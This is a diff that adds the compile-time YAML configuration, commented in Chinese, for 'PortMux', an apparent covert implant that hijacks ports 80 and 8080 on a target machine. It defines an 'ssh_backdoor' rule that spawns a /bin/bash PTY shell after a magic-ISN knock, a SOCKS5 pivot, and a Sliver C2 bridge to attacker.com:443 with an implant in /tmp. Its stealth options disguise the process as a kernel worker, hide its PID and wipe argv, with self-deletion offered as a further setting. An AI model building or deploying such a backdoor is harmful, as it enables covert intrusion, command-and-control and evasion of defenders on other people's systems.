@@ -1,0 +1,79 @@
+# PortMux 编译时配置 (嵌入二进制, 运行时零参数)
+# 编辑此文件后重新编译: ./build.sh
+# 网卡/劫持端口/magic_key 可在目标机 server.sh start 时交互指定(经环境变量覆盖)
+
+magic_key: "portmux-key-2024"     # ISN 派生密钥 + 流加密密钥派生源, 两端必须一致
+
+listen:
+  iface: "auto"                   # 网卡名; auto = 自动探测默认路由网卡
+  watch_ports: [80, 8080]        # 要劫持的端口(复用正常服务端口)
+
+rules:
+  # SSH 隐蔽接入 (magic ISN 敲门 + "SSH-2.0" 指纹 → PTY shell)
+  - name: ssh_backdoor
+    fingerprint: "SSH-2.0"
+    handler: shell
+    handler_args: { cmd: "/bin/bash", pty: "true" }
+    priority: 1
+
+  # SOCKS5 pivot
+  - name: socks5_pivot
+    fingerprint_raw: "\x05\x01\x00"
+    handler: socks5
+    priority: 2
+
+  # Sliver C2 bridge (mTLS ClientHello)
+  - name: sliver_c2
+    fingerprint_raw: "\x16\x03\x01"
+    handler: sliver
+    handler_args:
+      implant_port: "31337"
+      implant_path: "/tmp/sliver"
+      auto_start: "false"
+      c2_server: "attacker.com:443"
+    priority: 3
+
+  # 透明转发: HTTPS / HTTP / gRPC
+  - name: https_proxy
+    fingerprint_raw: "\x16\x03"
+    handler: tcp_proxy
+    handler_args: { target: "127.0.0.1:443" }
+    priority: 10
+  - name: http_get
+    fingerprint: "GET "
+    handler: tcp_proxy
+    handler_args: { target: "127.0.0.1:80" }
+    priority: 11
+  - name: http_post
+    fingerprint: "POST "
+    handler: tcp_proxy
+    handler_args: { target: "127.0.0.1:80" }
+    priority: 12
+  - name: gRPC_http2
+    fingerprint: "PRI * HTTP/2.0"
+    handler: tcp_proxy
+    handler_args: { target: "127.0.0.1:50051" }
+    priority: 14
+
+  # 兜底
+  - name: fallback
+    fingerprint: "*"
+    handler: tcp_proxy
+    handler_args: { target: "127.0.0.1:80" }
+    priority: 100
+
+crypto:
+  enabled: true                   # 流加密 (XChaCha20-Poly1305), 密钥由 magic_key 派生
+
+timeouts:
+  peek_seconds: 3                 # 指纹识别读取超时(秒)
+  idle_seconds: 300               # 代理类连接空闲超时(秒)
+
+limits:
+  max_conns: 256                  # 最大并发连接数
+
+stealth:
+  process_name: "[kworker/u:0]"   # prctl 进程名伪装
+  self_delete: false              # 启动后自删二进制
+  hide_proc: false                # getdents64 隐藏自身 PID / bpftool 枚举隐藏 (需内核支持 kprobe)
+  wipe_argv: false                # 抹除 argv/env (ps aux 无任何参数, 敏感环境变量不可见)
